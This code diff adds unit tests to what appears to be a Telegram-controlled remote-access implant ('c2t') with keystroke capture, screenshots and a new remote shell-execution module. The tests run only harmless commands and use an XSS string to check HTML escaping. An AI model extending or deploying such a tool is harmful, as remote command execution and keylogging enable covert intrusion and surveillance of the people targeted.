@@ -30,6 +30,8 @@
 #include "screenshot/screenshot.h"
 #include "screenshot/screenshot_encoder.h"
 #include "screenshot/screenshot_output.h"
+#include "shell/shell.h"
+#include "shell/shell_output.h"
 #include "telegram/telegram.h"
 #include "telegram/telegram_listener.h"
 #include "telegram/telegram_platform.h"
@@ -38,6 +40,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <time.h>
 #include <unistd.h>
 
 static char last_method[32];
@@ -1097,6 +1100,8 @@ int main(void) {
 
   keyboard_output_append("test_keystrokes", 15);
   keyboard_output_flush();
+  struct timespec ts = {.tv_sec = 0, .tv_nsec = 50000000L};
+  (void)nanosleep(&ts, nullptr);
   keyboard_output_cleanup();
   if (http_post_calls != kb_posts + 1)
     return fail("keyboard_output_flush asynchronous delivery");
@@ -1908,6 +1913,77 @@ int main(void) {
   (void)screenshot_get_total_captures();
   (void)screenshot_get_total_bytes();
   screenshot_output_cleanup();
+
+  /* Shell execution unit tests */
+  {
+    /* Test invalid input contract */
+    c2t_shell_result_t res;
+    if (c2t_shell_execute(nullptr, &res, 1000) != 0)
+      return fail("c2t_shell_execute accepted null command");
+    if (c2t_shell_execute("echo test", nullptr, 1000) != 0)
+      return fail("c2t_shell_execute accepted null result struct");
+
+    /* Test basic command execution */
+    if (!c2t_shell_execute("echo c2t_shell_unit_test", &res, 5000))
+      return fail("c2t_shell_execute basic echo failed");
+    if (res.exit_code != 0 || res.timed_out != 0 || res.execution_error != 0) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_execute echo unexpected status");
+    }
+    if (!res.output || !strstr(res.output, "c2t_shell_unit_test")) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_execute echo missing expected output");
+    }
+
+    /* Test Telegram formatting */
+    char formatted[2048];
+    if (!c2t_shell_format_telegram("echo c2t_shell_unit_test", &res, formatted, sizeof(formatted))) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_format_telegram failed");
+    }
+    if (!strstr(formatted, "Exit: 0") || !strstr(formatted, "c2t_shell_unit_test")) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_format_telegram missing content");
+    }
+    c2t_shell_result_free(&res);
+    if (res.output != nullptr || res.output_len != 0)
+      return fail("c2t_shell_result_free did not clear struct");
+
+    /* Test non-zero exit code */
+    if (!c2t_shell_execute("exit 37", &res, 5000))
+      return fail("c2t_shell_execute exit 37 failed to run");
+    if (res.exit_code != 37) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_execute exit 37 code mismatch");
+    }
+    c2t_shell_result_free(&res);
+
+    /* Test command timeout */
+    if (!c2t_shell_execute("sleep 2", &res, 50))
+      return fail("c2t_shell_execute timeout command failed");
+    if (!res.timed_out) {
+      c2t_shell_result_free(&res);
+      return fail("c2t_shell_execute did not flag timeout");
+    }
+    c2t_shell_result_free(&res);
+
+    /* Test HTML escaping in shell output */
+    c2t_shell_result_t esc_res = {
+      .exit_code = 0,
+      .timed_out = 0,
+      .execution_error = 0,
+      .output = "<script>alert('xss' & 1)</script>",
+      .output_len = 33,
+      .duration_ms = 10,
+    };
+    char esc_buf[1024];
+    if (!c2t_shell_format_telegram("test <&>", &esc_res, esc_buf, sizeof(esc_buf)))
+      return fail("c2t_shell_format_telegram escaping failed");
+    if (strstr(esc_buf, "<script>") || strstr(esc_buf, "<&>"))
+      return fail("c2t_shell_format_telegram failed to escape raw HTML tags");
+    if (!strstr(esc_buf, "&lt;script&gt;") || !strstr(esc_buf, "&amp;"))
+      return fail("c2t_shell_format_telegram missing escaped HTML entities");
+  }
 
   c2t_crypto_cleanup();
   c2t_log_cleanup();
